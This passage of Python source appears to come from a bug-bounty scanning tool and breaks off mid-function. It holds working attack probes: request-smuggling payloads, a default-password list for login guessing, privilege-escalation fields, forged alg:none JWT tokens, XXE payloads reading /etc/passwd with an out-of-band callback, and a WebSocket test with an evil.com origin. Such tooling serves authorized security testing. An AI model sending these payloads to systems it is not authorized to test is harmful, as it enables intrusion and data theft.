            # Error response can also indicate smuggling detected
            if b"400" in resp[:100]:
                return {
                    "technique": "CL.TE",
                    "confirmed": False,
                    "evidence": "400 Bad Request — TE header may be stripped",
                }
        except Exception as e:
            return {"technique": "CL.TE", "confirmed": False, "error": str(e)}

        return {"technique": "CL.TE", "confirmed": False, "evidence": "No anomaly"}

    def test_te_cl(self, url: str) -> Dict:
        """
        TE.CL smuggling probe.
        Frontend strips Transfer-Encoding, backend keeps it.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            if elapsed > 5:
                return {
                    "technique": "TE.CL",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible backend hang on partial chunk",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
        except Exception as e:
            return {"technique": "TE.CL", "confirmed": False, "error": str(e)}

        return {"technique": "TE.CL", "confirmed": False, "evidence": "No anomaly"}

    def scan(self, url: str) -> str:
        """Run both CL.TE and TE.CL probes against a target."""
        lines = [f"🚢 HTTP Request Smuggling Probe: {url}", "═" * 55,
                 "  ⚠️  Note: Timing-based — requires network stability for accuracy"]

        for test_fn in [self.test_cl_te, self.test_te_cl]:
            try:
                result = test_fn(url)
                tech = result.get("technique", "?")

                if result.get("confirmed") == "possible":
                    lines.append(f"\n  🟠 [HIGH] Possible {tech} Smuggling detected!")
                    lines.append(f"       Evidence: {result.get('evidence', '')}")
                    lines.append(f"       Time elapsed: {result.get('elapsed', 0):.2f}s")
                    lines.append(f"       💡 Verify with Burp Suite Pro → HTTP Request Smuggler extension")
                elif result.get("error"):
                    lines.append(f"  ⚠️  {tech}: Socket error — {result['error'][:60]}")
                else:
                    lines.append(f"  ✅ {tech}: No smuggling indicators (response normal)")
            except Exception as e:
                lines.append(f"  ⚠️  {test_fn.__name__}: {e}")

        lines.append("\n  ➜ For definitive detection, use: https://github.com/defparam/smuggler")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# ENHANCEMENTS: Existing classes — monkey-patched additions
# ══════════════════════════════════════════════════════════════════════════════


# ── AuthSessionEngine: test_login_bypass, test_mass_assignment ───────────────

def _ase_test_login_bypass(self, login_url: str, username_field: str = "username",
                            password_field: str = "password") -> str:
    """
    Test for default credentials and login bypass.
    Sends common default username/password combinations.
    """
    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("administrator", "administrator"), ("admin", "letmein"),
        ("test", "test"), ("guest", "guest"), ("user", "user"),
        ("admin", "pass"), ("admin", "1234"), ("admin", "Password1"),
        ("admin", "P@ssw0rd"), ("admin", "changeme"), ("admin", ""),
        ("", "admin"), ("admin", "admin1"), ("superadmin", "superadmin"),
    ]

    lines = [f"🔓 Login Bypass Test: {login_url}", "─" * 55]
    findings = []

    # Baseline: fetch the login page
    baseline = _get(login_url, timeout=8)
    if not baseline:
        return "  ❌ Cannot reach login URL"
    baseline_len = len(baseline.content)
    baseline_status = baseline.status_code

    for username, password in DEFAULT_CREDS:
        try:
            resp = _post(login_url, data={username_field: username, password_field: password},
                         timeout=8)
            if not resp:
                continue

            # Indicators of successful login:
            # 1. Redirect to a non-login page
            if resp.status_code in [301, 302, 303, 307, 308]:
                loc = resp.headers.get("Location", "")
                if loc and "login" not in loc.lower() and "error" not in loc.lower():
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "location": loc,
                        "message": f"Possible login with {username}:{password} → redirects to {loc}",
                    })

            # 2. Response significantly longer than failed login
            elif resp.status_code == 200:
                len_diff = len(resp.content) - baseline_len
                body = (resp.text or "").lower()
                # Look for success indicators
                success_indicators = [
                    "dashboard", "logout", "sign out", "welcome",
                    "profile", "account", "settings", "home",
                ]
                if any(ind in body for ind in success_indicators) and len_diff > 500:
                    findings.append({
                        "username": username, "password": password,
                        "status": resp.status_code, "len_diff": len_diff,
                        "message": f"Possible login with {username}:{password} (success indicators in body)",
                    })
        except Exception:
            continue

    if findings:
        lines.append(f"  🔴 {len(findings)} possible default credential(s) found!")
        for f in findings:
            lines.append(f"    🔴 [CRITICAL] {f['username']}:{f['password']} → {f['message'][:100]}")
        lines.append("  ➜ Verify manually — these may be true positives!")
    else:
        lines.append(f"  ✅ No default credentials worked ({len(DEFAULT_CREDS)} combinations tested)")
        lines.append(f"  💡 Also test: /admin, /wp-admin, /phpmyadmin for admin panels")

    return "\n".join(lines)


def _ase_test_mass_assignment(self, url: str, extra_fields: dict = None) -> str:
    """
    Test for mass assignment vulnerability by sending extra fields
    like role=admin, isAdmin=true, is_admin=1 in POST/PUT requests.
    """
    MASS_ASSIGN_PAYLOADS = [
        {"role": "admin"},
        {"isAdmin": "true"},
        {"is_admin": "1"},
        {"admin": "true"},
        {"privilege": "admin"},
        {"userType": "admin"},
        {"account_type": "premium"},
        {"subscription": "enterprise"},
        {"verified": "true"},
        {"email_verified": "true"},
    ]

    if extra_fields:
        MASS_ASSIGN_PAYLOADS.insert(0, extra_fields)

    lines = [f"🏋️  Mass Assignment Test: {url}", "─" * 55]

    # Baseline GET
    baseline = _get(url, timeout=8)
    if not baseline:
        return f"  ❌ Cannot reach {url}"

    baseline_body = (baseline.text or "").lower()
    findings = []

    for payload in MASS_ASSIGN_PAYLOADS:
        try:
            resp = _post(url, data=payload, timeout=8)
            if not resp:
                continue
            body = (resp.text or "").lower()

            # Look for elevated privilege indicators in response
            indicators = ["admin", "superuser", "privilege", "role", "verified"]
            for ind in indicators:
                if ind in body and ind not in baseline_body:
                    key = list(payload.keys())[0]
                    val = list(payload.values())[0]
                    findings.append({
                        "payload": payload,
                        "indicator": ind,
                        "message": f"Mass assignment: server reflected '{ind}' after sending {key}={val}",
                    })
                    break
        except Exception:
            continue

    if findings:
        lines.append(f"  🟠 {len(findings)} potential mass assignment issue(s):")
        for f in findings:
            lines.append(f"    🟠 [HIGH] {f['message']}")
    else:
        lines.append(f"  ✅ No mass assignment indicators found ({len(MASS_ASSIGN_PAYLOADS)} payloads tested)")
        lines.append("  💡 Also test PUT/PATCH endpoints — they're more likely to be vulnerable")

    return "\n".join(lines)


AuthSessionEngine.test_login_bypass = _ase_test_login_bypass
AuthSessionEngine.test_mass_assignment = _ase_test_mass_assignment


# ── JWTScanner: active token testing ─────────────────────────────────────────

def _jwt_test_forged_against_server(self, original_token: str, test_url: str,
                                     auth_header: str = "Authorization") -> Dict:
    """
    Actually send the forged alg:none token to the server and check response.
    Returns dict with confirmed bool and evidence.
    """
    forged = self._forge_alg_none(original_token)
    if not forged:
        return {"confirmed": False, "reason": "Could not forge alg:none token"}

    # Baseline: request without auth
    no_auth = _get(test_url, timeout=8)
    baseline_status = getattr(no_auth, "status_code", 0)
    baseline_len = len(getattr(no_auth, "content", b""))

    # Test with forged token
    test_resp = _get(test_url, headers={auth_header: f"Bearer {forged}"}, timeout=8)
    if not test_resp:
        return {"confirmed": False, "reason": "No response from server"}

    # Test with original token
    orig_resp = _get(test_url, headers={auth_header: f"Bearer {original_token}"}, timeout=8)
    orig_status = getattr(orig_resp, "status_code", 0)
    orig_len = len(getattr(orig_resp, "content", b""))

    forged_status = test_resp.status_code
    forged_len = len(test_resp.content)

    result = {
        "forged_token": forged[:80] + "...",
        "baseline_status": baseline_status,
        "original_token_status": orig_status,
        "forged_token_status": forged_status,
        "url": test_url,
    }

    # Confirmed if forged token gets same access as original
    if (orig_status == 200 and forged_status == 200 and
            abs(forged_len - orig_len) < orig_len * 0.1):
        result.update({
            "confirmed": True,
            "severity": "CRITICAL",
            "evidence": f"Forged alg:none token accepted! Same response as valid token (status {forged_status}, size {forged_len}b)",
        })
    elif forged_status == 200 and baseline_status != 200:
        result.update({
            "confirmed": "possible",
            "severity": "HIGH",
            "evidence": f"Forged token got {forged_status} while no-auth got {baseline_status} — suspicious",
        })
    else:
        result.update({
            "confirmed": False,
            "reason": f"Forged token rejected (status {forged_status})",
        })

    return result


JWTScanner.test_forged_against_server = _jwt_test_forged_against_server


# ── CVSS31Calculator: suggest_vector ─────────────────────────────────────────

def _cvss_suggest_vector(self, vuln_type: str) -> str:
    """
    Suggest a CVSS 3.1 vector string based on vulnerability type.
    Returns a pre-filled vector + calculated score.
    """
    VULN_VECTORS = {
        "xss_reflected":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Reflected XSS"),
        "xss_stored":         ("AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", "Stored XSS"),
        "sql_injection":      ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "sqli":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "SQL Injection"),
        "open_redirect":      ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Open Redirect"),
        "ssrf":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSRF"),
        "idor":               ("AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "IDOR"),
        "cors":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", "CORS Misconfiguration"),
        "ssti":               ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "SSTI / RCE"),
        "path_traversal":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "Path Traversal / LFI"),
        "missing_header":     ("AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N", "Missing Security Header"),
        "csrf":               ("AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", "CSRF"),
        "subdomain_takeover": ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "Subdomain Takeover"),
        "jwt_weak_secret":    ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT Weak Secret"),
        "jwt_alg_none":       ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "JWT alg:none bypass"),
        "rce":                ("AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Remote Code Execution"),
        "xxe":                ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", "XXE Injection"),
        "crlf":               ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", "CRLF Injection"),
        "host_header":        ("AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "Host Header Injection"),
        "sensitive_file":     ("AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "Sensitive File Exposure"),
        "prototype_pollution": ("AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N", "Prototype Pollution"),
    }

    key = vuln_type.lower().replace("-", "_").replace(" ", "_")
    if key not in VULN_VECTORS:
        # Try partial match
        for k in VULN_VECTORS:
            if k in key or key in k:
                key = k
                break
        else:
            available = ", ".join(VULN_VECTORS.keys())
            return f"  ❌ Unknown vuln type. Available: {available}"

    vector, name = VULN_VECTORS[key]
    result = self.calculate(vector)
    report = self.format_report(result)

    lines = [
        f"🎯 CVSS Suggestion for: {name}",
        f"  Vector: {vector}",
        report,
        "",
        f"  💡 This is a typical vector. Adjust PR/AC/UI/S based on your specific finding.",
    ]
    return "\n".join(lines)


CVSS31Calculator.suggest_vector = _cvss_suggest_vector


# ── ShodanEngine: EPSS lookup ─────────────────────────────────────────────────

def _shodan_get_epss_scores(self, cves: List[str]) -> Dict[str, Dict]:
    """
    Fetch EPSS (Exploit Prediction Scoring System) probability scores
    for a list of CVE IDs. Uses the free Cyentia EPSS API.
    Returns {cve_id: {"epss": float, "percentile": float}}.
    """
    if not cves:
        return {}
    # EPSS API accepts comma-separated CVE IDs (max ~30)
    cve_list = ",".join(cves[:20])
    url = f"https://api.first.org/data/v1/epss?cve={cve_list}"
    resp = _get(url, timeout=12)
    if not resp or resp.status_code != 200:
        return {}
    try:
        data = resp.json().get("data", [])
        return {
            entry["cve"]: {
                "epss":       float(entry.get("epss", 0)),
                "percentile": float(entry.get("percentile", 0)),
            }
            for entry in data
            if "cve" in entry
        }
    except Exception:
        return {}


def _shodan_format_report_with_epss(self, result: Dict) -> str:
    """Extended format_report that includes EPSS scores for CVEs."""
    base_report = ShodanEngine.format_report.__wrapped__(self, result) if hasattr(ShodanEngine.format_report, '__wrapped__') else ""

    cves = result.get("cves", [])
    if not cves or "error" in result or result.get("note"):
        return base_report  # Fall back to base report

    # Get EPSS scores
    epss_scores = self.get_epss_scores(cves)

    lines = [
        f"🌐 Shodan InternetDB: {result.get('target', result.get('ip', '?'))}",
        f"   IP: {result.get('ip', '?')}",
        "═" * 55,
    ]

    ports = result.get("ports", [])
    if ports:
        lines.append(f"  📡 Open Ports ({len(ports)}): {', '.join(str(p) for p in ports[:20])}")
        dangerous = [p for p in ports if p in [21, 22, 23, 25, 3306, 5432, 27017, 6379, 11211, 9200, 5601]]
        port_names = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 3306: "MySQL",
                      5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis",
                      11211: "Memcached", 9200: "Elasticsearch", 5601: "Kibana"}
        for p in dangerous:
            lines.append(f"    🔴 Port {p} ({port_names.get(p, '?')}) is open!")

    if cves:
        lines.append(f"\n  🚨 Known CVEs ({len(cves)}) with EPSS Exploit Probability:")
        for cve in cves[:10]:
            epss = epss_scores.get(cve, {})
            epss_pct = epss.get("epss", 0) * 100
            percentile = epss.get("percentile", 0) * 100
            if epss_pct > 10:
                risk_icon = "🔴"
                risk_label = f"HIGH EXPLOIT RISK: {epss_pct:.1f}% probability"
            elif epss_pct > 1:
                risk_icon = "🟠"
                risk_label = f"Moderate exploit risk: {epss_pct:.1f}%"
            else:
                risk_icon = "🟡"
                risk_label = f"Low exploit risk: {epss_pct:.2f}%"

            lines.append(f"    {risk_icon} {cve}")
            if epss:
                lines.append(f"       EPSS: {epss_pct:.2f}% exploit prob | Percentile: {percentile:.0f}th")
            lines.append(f"       → https://nvd.nist.gov/vuln/detail/{cve}")
    else:
        lines.append("  ✅ No known CVEs indexed")

    cpes = result.get("cpes", [])
    if cpes:
        lines.append(f"\n  🖥️  Software (CPE): {', '.join(cpes[:6])}")

    tags = result.get("tags", [])
    if tags:
        lines.append(f"\n  🏷️  Tags: {', '.join(tags)}")

    lines.append("\n" + "═" * 55)
    return "\n".join(lines)


ShodanEngine.get_epss_scores = _shodan_get_epss_scores
ShodanEngine.format_report = _shodan_format_report_with_epss


# ══════════════════════════════════════════════════════════════════════════════
# 16. XXE PROBE ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class XXEProbeEngine:
    """
    XML External Entity (XXE) injection testing.
    Tests XML-accepting endpoints for:
      1. File read via classic XXE (expect /etc/passwd or Windows equivalents)
      2. OOB XXE via Interactsh for blind detection
      3. Error-based XXE
      4. Parameter entity XXE
    """

    XXE_PAYLOADS = [
        # Classic file read
        (
            "xxe_classic",
            "HIGH",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',
            ["root:", "nobody:", "/bin/bash", "/sbin/nologin"],
        ),
        # Windows file read
        (
            "xxe_windows",
            "HIGH",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>''',
            ["[fonts]", "[extensions]", "[files]", "for 16-bit"],
        ),
        # Error-based XXE
        (
            "xxe_error",
            "MEDIUM",
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/nonexistent_bb_probe">
  %xxe;
]>
<root/>''',
            ["nonexistent", "No such file", "error", "DOCTYPE"],
        ),
    ]

    def probe(self, url: str, use_oob: bool = True) -> List[Dict]:
        """
        Test a URL for XXE by sending XML payloads.
        Tries common XML content types.
        """
        findings = []
        content_types = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
        ]

        # OOB setup via Interactsh
        oob = None
        if use_oob:
            oob = _interactsh_setup()

        for ct in content_types:
            for xx_id, severity, payload_text, indicators in self.XXE_PAYLOADS:
                try:
                    resp = _post(
                        url,
                        data=payload_text.encode("utf-8"),
                        headers={"Content-Type": ct},
                        timeout=10,
                    )
                    if not resp:
                        continue

                    body = resp.text or ""

                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            findings.append({
                                "type": f"xxe_{xx_id}",
                                "severity": severity,
                                "url": url,
                                "content_type": ct,
                                "indicator": indicator,
                                "message": f"XXE file read confirmed! Found '{indicator}' in response",
                                "confirmed": True,
                            })
                            break

                    # Check for error-based disclosure
                    if resp.status_code in [500, 400] and any(
                        ind in body.lower() for ind in ["xml", "entity", "doctype", "parse"]
                    ):
                        findings.append({
                            "type": "xxe_error_disclosure",
                            "severity": "MEDIUM",
                            "url": url,
                            "content_type": ct,
                            "message": f"XML parsing error in response — server processes XML with {ct}",
                            "evidence": body[:200],
                            "confirmed": "possible",
                        })

                except Exception:
                    continue

        # OOB blind XXE
        if oob and oob.get("ok"):
            callback = oob["callback_url"]
            oob_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback}/xxe">
  %xxe;
]>
<root/>'''.format(callback=callback)

            for ct in content_types[:1]:
                try:
                    _post(url, data=oob_payload.encode(), headers={"Content-Type": ct}, timeout=8)
                    import time as _t
                    _t.sleep(5)
                    poll = _get(
                        f"{oob['server']}/poll?id={oob['correlation_id']}&secret={oob['correlation_id']}",
                        timeout=8,
                    )
                    if poll and poll.status_code == 200:
                        data = poll.json() if poll.text else {}
                        interactions = data.get("data") or data.get("interactions") or []
                        if interactions:
                            findings.append({
                                "type": "xxe_oob_blind",
                                "severity": "CRITICAL",
                                "url": url,
                                "message": "Blind XXE confirmed via OOB Interactsh callback!",
                                "callback": callback,
                                "interactions": interactions[:3],
                                "confirmed": True,
                            })
                except Exception:
                    pass

        # Deduplicate
        seen = set()
        unique = []
        for f in findings:
            key = (f["type"], f.get("indicator", ""))
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def format_report(self, findings: List[Dict]) -> str:
        if not findings:
            return "  ✅ No XXE indicators found (tested classical + OOB techniques)"

        lines = [f"💉 XXE Injection Results — {len(findings)} finding(s)", "═" * 55]
        for f in findings:
            sev = f.get("severity", "MEDIUM")
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(sev, "•")
            lines.append(f"  {icon} [{sev}] {f['message']}")
            if f.get("indicator"):
                lines.append(f"       Indicator  : '{f['indicator']}'")
            if f.get("content_type"):
                lines.append(f"       Content-Type: {f['content_type']}")
            if f.get("callback"):
                lines.append(f"       OOB Callback: {f['callback']}")
        lines.append("  ➜ Submit this immediately — XXE is typically HIGH/CRITICAL bounty")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 17. HUNT SESSION  (persistence across runs)
# ══════════════════════════════════════════════════════════════════════════════

class HuntSession:
    """
    Persist the full state of an active bug bounty hunt across runs.
    Stores: scope, findings, discovered subdomains, scan timestamps,
            session metadata (program, platform, start date).

    Files saved to: hunt_sessions/<domain>.json
    """

    SESSIONS_DIR = "hunt_sessions"

    def __init__(self, domain: str = ""):
        self.domain = domain
        self.scope: List[str] = []
        self.findings: List[Dict] = []
        self.subdomains: List[str] = []
        self.scanned_urls: List[str] = []
        self.metadata: Dict = {}
        self._path = ""
        os.makedirs(self.SESSIONS_DIR, exist_ok=True)
        if domain:
            self._path = os.path.join(self.SESSIONS_DIR, f"{domain.replace('.', '_')}.json")

    def save(self) -> str:
        """Save current hunt state to disk."""
        if not self._path:
            return "  ❌ No domain set — call HuntSession(domain)"
        state = {
            "domain": self.domain,
            "scope": self.scope,
            "findings": self.findings,
            "subdomains": self.subdomains,
            "scanned_urls": self.scanned_urls,
            "metadata": {
                **self.metadata,
                "last_updated": datetime.now().isoformat(),
            },
        }
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2)
        return f"  ✅ Hunt session saved: {self._path}"

    def load(self, domain: str = "") -> bool:
        """Load a saved hunt session."""
        domain = domain or self.domain
        if not domain:
            return False
        path = os.path.join(self.SESSIONS_DIR, f"{domain.replace('.', '_')}.json")
        if not os.path.exists(path):
            return False
        try:
            with open(path, "r", encoding="utf-8") as f:
                state = json.load(f)
            self.domain = state.get("domain", domain)
            self.scope = state.get("scope", [])
            self.findings = state.get("findings", [])
            self.subdomains = state.get("subdomains", [])
            self.scanned_urls = state.get("scanned_urls", [])
            self.metadata = state.get("metadata", {})
            self._path = path
            return True
        except Exception:
            return False

    def status(self) -> str:
        """Return a summary of the current hunt session."""
        lines = [
            f"🏹 Hunt Session: {self.domain or '(none)'}",
            "─" * 55,
            f"  Scope      : {len(self.scope)} domain(s)",
            f"  Subdomains : {len(self.subdomains)} discovered",
            f"  Findings   : {len(self.findings)} logged",
            f"  Scanned    : {len(self.scanned_urls)} URL(s)",
        ]
        if self.metadata.get("last_updated"):
            lines.append(f"  Last Update: {self.metadata['last_updated'][:16]}")
        if self._path:
            lines.append(f"  Save Path  : {self._path}")
        return "\n".join(lines)

    @classmethod
    def list_sessions(cls) -> str:
        """List all saved hunt sessions."""
        sessions_dir = cls.SESSIONS_DIR
        if not os.path.exists(sessions_dir):
            return "  ℹ️  No hunt sessions directory found."
        files = [f for f in os.listdir(sessions_dir) if f.endswith(".json")]
        if not files:
            return "  ℹ️  No saved hunt sessions yet."
        lines = [f"📂 Saved Hunt Sessions ({len(files)}):"]
        for f in sorted(files):
            path = os.path.join(sessions_dir, f)
            try:
                with open(path) as fh:
                    state = json.load(fh)
                domain = state.get("domain", f.replace("_", ".")[:-5])
                updated = state.get("metadata", {}).get("last_updated", "?")[:10]
                n_findings = len(state.get("findings", []))
                lines.append(f"  • {domain:<30} {n_findings} finding(s) | Updated: {updated}")
            except Exception:
                lines.append(f"  • {f} (unreadable)")
        lines.append(f"\n  ➜ Load: /bugbounty session load <domain>")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 13. DOM XSS ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class DOMXSSEngine:
    """
    DOM-based XSS detection via static analysis of JS sinks and sources.
    Does NOT require a browser — uses regex on JS files and HTML.

    Checks for:
      - Dangerous sinks: innerHTML, outerHTML, document.write, eval,
        location.href assignment, location.replace, insertAdjacentHTML
      - User-controlled sources: location.hash, location.search,
        document.referrer, URLSearchParams
    """

    DANGEROUS_SINKS = [
        ("innerHTML",          "HIGH",    "innerHTML = ... allows HTML injection"),
        ("outerHTML",          "HIGH",    "outerHTML = ... allows HTML injection"),
        ("document.write",     "HIGH",    "document.write() renders unsanitized HTML"),
        ("document.writeln",   "HIGH",    "document.writeln() renders unsanitized HTML"),
        ("insertAdjacentHTML", "HIGH",    "insertAdjacentHTML() allows HTML injection"),
        ("eval(",              "CRITICAL","eval() executes arbitrary JS"),
        ("Function(",          "CRITICAL","Function() constructor executes arbitrary JS"),
        ("setTimeout(",        "MEDIUM",  "setTimeout(string) can execute code"),
        ("setInterval(",       "MEDIUM",  "setInterval(string) can execute code"),
        ("location.href",      "MEDIUM",  "location.href = userInput → open redirect / XSS"),
        ("location.replace(",  "MEDIUM",  "location.replace() with user input = open redirect"),
        ("location.assign(",   "MEDIUM",  "location.assign() with user input = open redirect"),
        ("window.open(",       "MEDIUM",  "window.open() with user input = redirect risk"),
        ("$.html(",            "HIGH",    "jQuery .html() renders unsanitized HTML"),
        ("$(",                 "LOW",     "jQuery selector may render unescaped HTML"),
    ]

    USER_SOURCES = [
        "location.hash",
        "location.search",
        "location.href",
        "document.referrer",
        "document.cookie",
        "URLSearchParams",
        "window.name",
        "postMessage",
    ]

    # Pattern: sink appears near a source (within 500 chars)
    SOURCE_PATTERN = re.compile(
        r'(?:' + '|'.join(re.escape(s) for s in [
            "location.hash", "location.search", "document.referrer",
            "URLSearchParams", "window.name", "postMessage",
            "getQueryParam", "getParameter", "decodeURI",
        ]) + r')',
        re.IGNORECASE
    )

    def analyze_js(self, js_text: str, source_url: str = "<inline>") -> List[Dict]:
        """
        Scan JS text for dangerous DOM sink patterns.
        Returns findings with line numbers and context.
        """
        findings = []
        lines = js_text.splitlines()

        for i, line in enumerate(lines, 1):
            # Check for sources in this line
            has_source = bool(self.SOURCE_PATTERN.search(line))

            for sink, severity, description in self.DANGEROUS_SINKS:
                if sink.lower() in line.lower():
                    # Upgrade severity if source is nearby (same line or ±5 lines)
                    ctx_start = max(0, i - 6)
                    ctx_end = min(len(lines), i + 5)
                    ctx_block = "\\n".join(lines[ctx_start:ctx_end])
                    source_nearby = bool(self.SOURCE_PATTERN.search(ctx_block))

                    actual_sev = severity
                    flow_note = ""
                    if source_nearby:
                        if severity == "MEDIUM":
                            actual_sev = "HIGH"
                        elif severity == "LOW":
                            actual_sev = "MEDIUM"
                        flow_note = " [USER INPUT → SINK DATA FLOW DETECTED]"

                    # Skip obvious false positives (commented lines, string literals)
                    stripped = line.strip()
                    if stripped.startswith("//") or stripped.startswith("*"):
                        continue

                    findings.append({
                        "type": "dom_xss",
                        "sink": sink,
                        "severity": actual_sev,
                        "description": description + flow_note,
                        "line": i,
                        "code": line.strip()[:120],
                        "source_url": source_url,
                        "data_flow": source_nearby,
                    })

        # Deduplicate: same sink + same line
        seen = set()
        unique = []
        for f in findings:
            key = (f["sink"], f["line"])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def scan_url(self, url: str) -> str:
        """Fetch a URL and scan all linked JS files for DOM XSS."""
        resp = _get(url, timeout=12)
        if not resp or resp.status_code != 200:
            return f"  ❌ Could not fetch {url}"

        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        page_text = resp.text or ""

        # Find all script src
        js_urls = []
        for m in re.finditer(r'src=["\'](.*?\.js(?:\?[^"\']*)?)["\']', page_text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("//"):
                js_urls.append("https:" + src)
            elif src.startswith("/"):
                js_urls.append(base + src)

        all_findings = []

        # Scan inline scripts
        inline = re.findall(r'<script(?:[^>]*)>(.*?)</script>', page_text, re.DOTALL | re.IGNORECASE)
        for i, block in enumerate(inline):
            all_findings.extend(self.analyze_js(block, f"{url}#inline-{i}"))

        # Scan external JS files (limit to 8)
        for js_url in js_urls[:8]:
            js_resp = _get(js_url, timeout=10)
            if js_resp and js_resp.status_code == 200:
                all_findings.extend(self.analyze_js(js_resp.text or "", js_url))

        return self.format_report(all_findings, url, len(js_urls))

    def format_report(self, findings: List[Dict], url: str = "", js_count: int = 0) -> str:
        """Format DOM XSS findings."""
        if not findings:
            return f"  ✅ No DOM XSS sinks found (scanned {js_count} JS file(s) + inline scripts)"

        # Filter: prioritize confirmed data flows
        confirmed_flows = [f for f in findings if f.get("data_flow")]
        other = [f for f in findings if not f.get("data_flow")]

        lines = [f"🌐 DOM XSS Analysis: {url}", "═" * 60]

        if confirmed_flows:
            lines.append(f"\n  🔴 Confirmed Data Flows ({len(confirmed_flows)}) — USER INPUT → DANGEROUS SINK:")
            for f in confirmed_flows[:10]:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(f["severity"], "•")
                lines.append(f"    {icon} [{f['severity']}] Sink: `{f['sink']}` at line {f['line']}")
                lines.append(f"       File: {f['source_url'].split('/')[-1][:50]}")
                lines.append(f"       Code: {f['code'][:100]}")

        if other:
            lines.append(f"\n  🟡 Potential Sinks ({len(other)}) — Manual Review Needed:")
            for f in other[:8]:
                lines.append(f"    • [{f['severity']}] `{f['sink']}` at line {f['line']} — {f['description'][:80]}")

        lines.append(f"\n  ➜ Use Playwright/headless Chrome to dynamically confirm DOM XSS")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 14. WEBSOCKET ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketEngine:
    """
    Basic WebSocket security testing.
    Tests for:
      - Missing authentication (unauthenticated WS connection)
      - Missing Origin check (WS CSRF)
      - Reflected data in messages (WS-XSS)
      - Message-based injection (XSS/SQLi in WS messages)

    Requires: websocket-client (pip install websocket-client)
    Gracefully skips if not installed.
    """

    def _check_ws_available(self):
        try:
            import websocket
            return True
        except ImportError:
            return False

    def test_connection(self, ws_url: str, origin: str = "https://evil.com",
                        timeout: int = 8) -> Dict:
        """
        Attempt to connect to a WebSocket endpoint.
        Returns connection result dict.
        """
        if not self._check_ws_available():
            return {
                "error": "websocket-client not installed. Run: pip install websocket-client",
                "install_hint": "pip install websocket-client",
            }

        import websocket as ws_lib
        result = {
            "url": ws_url,
            "connected": False,
            "accepted_evil_origin": False,
            "messages": [],
            "error": None,
        }

        try:
            ws = ws_lib.create_connection(
                ws_url,
                timeout=timeout,
                header={"Origin": origin},
                suppress_origin=False,
            )
            result["connected"] = True
            result["accepted_evil_origin"] = True  # Connected with evil origin!

            # Try to receive any initial messages
            ws.settimeout(3)
            try:
                msg = ws.recv()
